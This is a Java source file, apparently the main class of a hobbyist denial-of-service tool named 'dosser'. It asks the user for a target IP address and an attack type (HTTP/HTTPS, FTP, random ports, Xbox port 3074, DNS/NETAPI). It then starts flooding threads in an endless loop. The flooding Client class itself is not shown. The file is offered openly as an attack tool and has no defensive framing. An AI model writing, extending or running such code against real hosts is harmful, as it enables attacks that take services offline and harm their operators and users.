package s4mick.dosser;

/**
 *
 * @author S4mick - @S4mick
 */
public class Main {

  
    public static void main(String[] args) {
        int FlagPort=0;
     
  Lettura l=new Lettura();    //Leggi ip e numero thread poi .. take down
  System.out.println("Inserisci l'indirizzo ip da attaccare  :\n");
  String IP=l.leggiString(); // Read string
  System.out.println("Select type of attack:\n-1 HTTP e HTTPS mixed\n-2 HTTPS e FTP\n-3 Random Ports(do you have a lot of bandwidth?)\n-4 Xbox(3074)\n-5 DNS e NETAPI");
   FlagPort=l.leggiInt(); // Read integer
 
 
  
  int i=0;
  
 while(true){ // Might crashs your pc if poor specs... infinite loop execute in some ide,VM so you can stop it or just edit this code to stop when key pressed.. might add some updates if ppl like it
      i++;
     Client c=new Client(IP,FlagPort);
       Thread t = new Thread(c);
          t.start();       
  }
       
        
      
      
    
        
        
    }
    
}
